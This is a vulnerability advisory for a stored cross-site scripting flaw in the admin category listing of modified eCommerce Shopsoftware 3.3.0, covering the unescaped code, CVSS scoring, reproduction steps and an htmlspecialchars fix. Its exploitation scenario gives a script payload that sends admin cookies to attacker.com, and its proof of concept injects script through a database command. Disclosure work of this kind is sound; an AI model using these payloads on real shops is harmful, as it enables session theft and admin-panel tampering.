# Stored Cross-Site Scripting in Admin Category Listing of modified eCommerce Shopsoftware

## Vulnerability Information

| Field              | Details                         |
| ------------------ | ------------------------------- |
| Advisory ID        | VULN-2026-003                   |
| CVE ID             | Pending assignment              |
| Vendor             | modified-shop                   |
| Product            | modified eCommerce Shopsoftware |
| Tested Version     | 3.3.0 (rev. 16825)              |
| Vulnerability Type | Stored Cross-Site Scripting     |
| CWE                | CWE-79                          |
| Severity           | Medium (Provisional)            |
| CVSS v3.1          | 4.8                             |
| Discovery Date     | 2026-11-18                      |
| Publication Date   | Pending                         |
| Patch Status       | No fix documented               |
| Disclosure Status  | Pending                         |

---

## 1. Executive Summary

A stored cross-site scripting (Stored XSS) vulnerability was identified in modified eCommerce Shopsoftware v3.3.0 due to improper output encoding of the `categories_name` field within the administrative category listing page.

The vulnerability originates in `admin/listcategories.php` (line 64), where the value of `$categories['categories_name']` is rendered directly within an HTML table cell without appropriate HTML encoding through `htmlspecialchars()`.

The following code excerpt illustrates the improper handling of the affected field:

```php
// admin/listcategories.php:64 — categories_name without htmlspecialchars():
echo '  <td class="dataTableContent">'.$categories['categories_name'].'</td>';
```

The `categories_name` field is processed through `xtc_db_prepare_input()` and stored in the `categories_description` database table. When the administrative category listing page is accessed, the stored value is retrieved and rendered without context-appropriate output encoding.

As a result, an authenticated user with permission to modify category records could inject arbitrary JavaScript that is subsequently executed in the browser of other administrators accessing the affected page.

Successful exploitation requires an authenticated user with category editing permissions and interaction from an administrator accessing the category listing page.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/listcategories.php:64 | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker), Smarty 3

---

## 3. Vulnerability Description

### Storage (`admin/categories.php`)

```php
// admin/categories.php — categories_name stored without HTML encoding:
'categories_name' => xtc_db_prepare_input($_POST['categories_name'][$languages[$i]['id']]),
// xtc_db_prepare_input = trim() + stripslashes() only — no htmlspecialchars()
```

### Rendering (`admin/listcategories.php:64`)

```php
// admin/listcategories.php:62-65 — categories_name echoed without htmlspecialchars():
while ($categories = xtc_db_fetch_array($categories_query)) {
    echo '  <tr>';
    echo '  <td class="dataTableContent">'.$categories['categories_name'].'</td>';
    // ...
}
```

### Necessary Conditions

- **Authentication:** Admin (to inject `categories_name` and to trigger the XSS)
- **User interaction:** Required — admin must visit Admin → Products → Categories listing
- **Attack vector:** Network

---

## 4. Impact

**Admin panel (CVSS 4.8):**
- Confidentiality: Low — admin session tokens (if non-HttpOnly), CSRF tokens
- Integrity: Low — admin panel manipulation
- Scope: Changed — admin browser affected

---

## 5. Classification

### CVSS (admin injection, admin trigger)

- **Score:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE / CAPEC

- CWE-79 / CAPEC-198: Stored XSS

---

## 6. Exploitation Scenario

1. Admin navigates to Admin → Products → Categories → edit a category.
2. Admin sets the **Name** field to `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`.
3. Any admin who views the category listing page (`admin/listcategories.php`) triggers the script from `line 64`.

---

## 7. Technical Evidence

### Affected Components

```text
Admin:   admin/categories.php — categories_name stored via xtc_db_prepare_input (no htmlspecialchars)
         admin/listcategories.php:64 — echo $categories['categories_name'] (no htmlspecialchars)
Database table: categories_description (column: categories_name)
Parameter(s): categories_name[<lang_id>] (POST — admin/categories.php)
Authentication: Admin to inject and to trigger
```

### Example Inject

```bash
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE categories_description
      SET categories_name='<script>alert(document.cookie)</script>'
      WHERE categories_id=1 AND language_id=2;" 2>/dev/null
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE categories_description
      SET categories_name='<script>alert(\"V67_listcategories\")</script>'
      WHERE categories_id=1 AND language_id=2;" 2>/dev/null

echo "[*] Admin visits admin/listcategories.php to trigger XSS."
```

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Products → Categories → edit a category. Set **Name** to `<script>alert(1)</script>`. Save.
3. Navigate to Admin → Products → Category Listing.
4. `alert(1)` fires from `admin/listcategories.php:64`.

---

## 10. Fix

```php
// admin/listcategories.php:64 — fix:
echo '  <td class="dataTableContent">'.htmlspecialchars($categories['categories_name'], ENT_QUOTES, 'UTF-8').'</td>';
```

---

## 11. Disclosure Timeline

| Date | Event |
|---|---|
| 18/11/2026 | Identified via code review |
| 18/11/2026 | Advisory prepared |
| pending | Vendor notified |

---

## 12. Credits

- **Researcher:** Van Alyson Dutra (@4rch30n), Marcus de Almeida (@maarckz) & Daniel Costa (@bscosta91)
- **Contact:** van.vep@gmail.com

---

## 13. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html

---

## 14. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 15. Contact

- **Email:** van.vep@gmail.com
- **Repository:** https://github.com/4RCH30N/Vuln-Research/
